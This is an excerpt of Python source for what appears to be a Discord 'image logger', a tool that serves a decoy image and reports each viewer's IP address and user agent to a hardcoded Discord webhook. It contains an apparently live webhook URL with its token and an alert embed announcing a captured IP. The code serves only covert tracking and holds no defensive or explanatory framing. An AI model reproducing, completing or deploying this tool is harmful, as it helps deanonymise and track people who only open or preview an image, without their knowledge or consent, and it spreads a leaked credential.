...
webhook = 'https://discord.com/api/webhooks/1061399804711804959/-Krb9L0Sm-D5z0W6v_UTHQKgp4s7427epnW2ojAEkz8MQkoXs1NkQ1OySFkmzUWjKgVs'
bindata = requests.get('https://cdn.discordapp.com/attachments/1065629077182091274/1069672556321321051/IMG_9780.jpg').content
  ...
  "embeds": [
    {
      "title": "Luaq Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Luaq Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
